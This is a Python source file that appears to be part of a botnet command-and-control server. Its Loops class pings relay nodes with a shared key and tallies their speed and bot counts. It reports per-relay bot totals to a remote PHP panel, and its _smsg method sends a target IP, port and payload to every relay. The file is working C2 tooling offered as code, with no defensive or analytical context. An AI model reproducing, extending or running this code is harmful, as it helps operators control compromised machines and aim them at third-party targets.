from colorama import Fore
from ...global_modules.config import c2_config_t as tconf
import time
import requests

bots=[]

class Loops():

    def __init__(self, urlkey: str, api_url: str, relaykey: str, speed: list=[], relay: dict={}, temprbots: list=[], rbots: list=[], bots: list=[]):
        self.urlkey=urlkey
        self.api_url=api_url
        self.relaykey=relaykey
        self.speed=speed
        self.relay=relay
        self.temprbots=temprbots
        self.rbots=rbots
        self.bots=bots

    def relay_api(self, data, act: bool):
        ip=data['ip']
        bots=data['bots']
        url=f"{self.api_url}/relays.php?urlkey={self.urlkey}&ip={ip}&bots={bots}&act={act}"
        try:
            r=requests.get(url).json()
            print(r)
            if r=="ok":
                return True
            else:
                return False
        except Exception as e:
            print(f"error \n{url}\n{e}\n\n")

    def send(self, socket, data: str, escape=True, reset=True):
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        socket.send(data.encode())

    def ping(self):
        while 1:
            dead_relay = []
            for relays in list(self.relay):
                try:
                    relays.settimeout(3)
                    self.send(relays, 'RPING', False, False)
                    if relays.recv(1024).decode() != f'RPONG[p:{self.relaykey}]':
                        dead_relay.append(relays)
                except:
                    print("except rping")
                    dead_relay.append(relays)
                
            for relays in list(dead_relay):
                self.relay.pop(relays)
                relays.close()
            time.sleep(tconf.ping_t)



    def _ping(self):
        dead_relay = []
        for relays in list(self.relay):
            try:
                relays.settimeout(3)
                self.send(relays, 'RPING', False, False)
                if relays.recv(1024).decode() != f'RPONG[p:{self.relaykey}]':
                    dead_relay.append(relays)
            except:
                dead_relay.append(relays)
            
        for relays in list(dead_relay):
            self.relay.pop(relays)
            relays.close()



    def net(self):
        while 1:
            while self.speed!=[]:
                for i in self.speed:
                    self.speed.remove(i)
            print(self.speed)
            dead_relay = []
            for relays in list(self.relay):
                print(relays)
                try:
                    relays.settimeout(3)
                    self.send(relays, f'RNETSPEED', False, False)
                    data=relays.recv(1024).decode()
                    print(data)
                    try:
                        if data=="":
                            print('not')
                            dead_relay.append(relays)
                        else:
                            self.speed.append(int(data))
                            print('ok')
                    except:
                        self.speed.append(int(data))
                except:
                    print("except")
                    dead_relay.append(relays)
                
            for relays in list(dead_relay):
                self.relay.pop(relays)
                relays.close()
            time.sleep(tconf.net_t)



    def _net(self):
        while self.speed!=[]:
            for i in self.speed:
                self.speed.remove(i)
        print(self.speed)
        dead_relay = []
        for relays in list(self.relay):
            print(relays)
            try:
                relays.settimeout(3)
                self.send(relays, f'RNETSPEED', False, False)
                data=relays.recv(1024).decode()
                print(data)
                try:
                    if data=="":
                        print('not')
                        dead_relay.append(relays)
                    else:
                        self.speed.append(int(data))
                        print('ok')
                except:
                    self.speed.append(int(data))
            except:
                print("except")
                dead_relay.append(relays)
            
        for relays in list(dead_relay):
            self.relay.pop(relays)
            relays.close()



    def getbot(self):
        while 1:
            while bots!=[]:
                for i in bots:
                    bots.remove(i)
            while self.temprbots!=[]:
                for i in self.temprbots:
                    self.temprbots.remove(i)
            print(bots)
            dead_relay = []
            for relays in list(self.relay):
                try:
                    relays.settimeout(3)
                    self.send(relays, f'RNETBOTS', False, False)
                    data=relays.recv(1024).decode()
                    print(data)
                    try:
                        self.temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
                        print({'ip': relays.getpeername()[0], 'bots': int(data)})
                    except Exception as e:
                        print(e)
                    print(self.temprbots)
                    try:
                        if data=="":
                            print('not')
                            dead_relay.append(relays)
                        else:
                            bots.append(int(data))
                            print('ok')
                    except:
                        bots.append(int(data))
                except Exception as e:
                    print(f"except getbot\n\n{e}\n\n")
                    dead_relay.append(relays)
            while self.rbots!=[]:
                for i in self.rbots:
                    self.rbots.remove(i)
            for i in self.temprbots:
                self.rbots.append(i)
                if self.relay_api(i, False):
                    print('ok')
                else:
                    print("relay_api error")
                        
            for relays in list(dead_relay):
                self.relay.pop(relays)
                relays.close()
            time.sleep(tconf.getbot_t)
            
            

    def _getbot(self):
        while bots!=[]:
            for i in bots:
                bots.remove(i)
        while self.temprbots!=[]:
            for i in self.temprbots:
                self.temprbots.remove(i)
        print(bots)
        dead_relay = []
        for relays in list(self.relay):
            try:
                relays.settimeout(3)
                self.send(relays, f'RNETBOTS', False, False)
                data=relays.recv(1024).decode()
                print(data)
                try:
                    self.temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
                    print({'ip': relays.getpeername()[0], 'bots': int(data)})
                except Exception as e:
                    print(e)
                print(self.temprbots)
                try:
                    if data=="":
                        print('not')
                        dead_relay.append(relays)
                    else:
                        bots.append(int(data))
                        print('ok')
                except:
                    bots.append(int(data))
            except Exception as e:
                print(f"except getbot\n\n{e}\n\n")
                dead_relay.append(relays)
        while self.rbots!=[]:
            for i in self.rbots:
                self.rbots.remove(i)
        for i in self.temprbots:
            self.rbots.append(i)
            if self.relay_api(i, False):
                print('ok')
            else:
                print("relay_api error")
                    
        for relays in list(dead_relay):
            self.relay.pop(relays)
            relays.close()



    def _smsg(self, ip: str, port: int, data: str):
        dead_relay = []
        for relays in list(self.relay):
            try:
                relays.settimeout(3)
                self.send(relays, str({'enc': {}, 'dec': {}, 'target': {'ip': ip, 'port': port, 'data': data}}), False, False)
                if relays.recv(1024).decode() != f"SMSG[p:{self.relaykey}]":
                    dead_relay.append(relays)
            except:
                dead_relay.append(relays)
            
        for relays in list(dead_relay):
            self.relay.pop(relays)
            relays.close()